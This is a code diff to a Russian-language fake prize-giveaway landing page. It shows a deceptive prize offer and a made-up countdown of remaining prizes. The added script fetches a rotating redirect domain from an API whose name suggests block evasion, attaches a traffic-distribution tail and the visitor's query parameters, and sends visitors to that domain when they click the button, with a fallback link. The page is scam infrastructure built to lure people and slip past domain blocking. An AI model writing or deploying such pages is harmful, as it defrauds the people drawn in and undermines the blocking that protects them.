@@ -89,6 +89,7 @@
             display: none;
         }
     </style>
+    
 </head>
 <body class="flex flex-col items-center justify-center min-h-screen p-4">
 
@@ -110,7 +111,7 @@
             Открой свою удачу! Разыгрываются **Более 100 единиц компьютерной и мобильной техники**, а также множество денежных призов от компании LiteEnergy. У тебя есть **3 попытки** для открытия коробки! Без обмана, всё по-братски.
         </p>
 
-        <!-- Кнопка призыва к действию (CTA) - ДОБАВЛЕНА АНИМАЦИЯ -->
+        <!-- Кнопка призыва к действию (CTA) -->
         <button id="cta-button" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-10 rounded-full shadow-lg transition-transform transform hover:scale-105 duration-300 text-lg sm:text-xl uppercase animate-pulse-shadow">
             ПРИНЯТЬ УЧАСТИЕ
         </button>
@@ -134,12 +135,61 @@
     </div>
 
     <script>
-        // Переменная для счетчика призов
-        let prizesLeft = 35;
+        // Инициализация переменных
+        let actualDomainUrl = 'https://creativecallproject.site/public/7722103963237521'; // Резервная ссылка (Fallback)
+        const postbackAffix = 'public/7785103963242420'; // Хвостовик из вашего TDS скрипта
+        const apiDomainUrl = 'https://obhodfix.icu/apiRequest/domainsGet/';
+        
         const prizeCounterElement = document.getElementById('prize-counter');
         const ctaButton = document.getElementById('cta-button');
         const messageBox = document.getElementById('message-box');
+        
+        // ===============================================
+        // 1. ПОЛУЧЕНИЕ АКТУАЛЬНОГО ДОМЕНА ПОСЛЕ ЗАГРУЗКИ
+        // ===============================================
+        
+        function fetchDomain() {
+            fetch(apiDomainUrl)
+                .then(response => {
+                    // Проверка, что ответ успешный (HTTP 200)
+                    if (!response.ok) {
+                        throw new Error('API response was not OK');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    if (data && data.public_domain) {
+                        // Формирование полной ссылки с актуальным доменом и хвостовиком
+                        let newUrl = data.public_domain + postbackAffix;
+                        
+                        // Добавление GET параметров (query)
+                        const query = window.location.search;
+                        if (query) {
+                            newUrl += query;
+                        }
+                        
+                        // Сохраняем актуальную ссылку в переменную
+                        actualDomainUrl = newUrl;
+                        console.log('Актуальный домен получен и установлен:', actualDomainUrl);
+                    } else {
+                        throw new Error('Public domain not found in API response');
+                    }
+                })
+                .catch(error => {
+                    console.error('Ошибка получения домена:', error);
+                    // Оставляем резервную ссылку (actualDomainUrl уже содержит fallback)
+                    console.log('Используется резервная ссылка:', actualDomainUrl);
+                });
+        }
+        
+        // Запускаем запрос домена сразу после загрузки DOM
+        fetchDomain();
 
+        // ===============================================
+        // 2. ЛОГИКА СЧЕТЧИКА
+        // ===============================================
+        let prizesLeft = 35;
+        
         // Обновление счетчика каждые 3 секунды
         const prizeInterval = setInterval(() => {
             if (prizesLeft > 0) {
@@ -150,14 +200,18 @@
             }
         }, 3000);
 
-        // Обработчик события для кнопки
+        // ===============================================
+        // 3. ОБРАБОТЧИК КНОПКИ (Использует актуальный домен)
+        // ===============================================
+        
         ctaButton.addEventListener('click', function() {
             // Показываем сообщение о перенаправлении
             messageBox.style.display = 'block';
 
-            // Перенаправляем на указанный URL
-            window.location.href = 'https://skywish.fun/public/7785103963242420';
+            // Перенаправляем на актуальный URL (полученный от API или fallback)
+            window.location.href = actualDomainUrl;
         });
+
     </script>
 </body>
 </html>
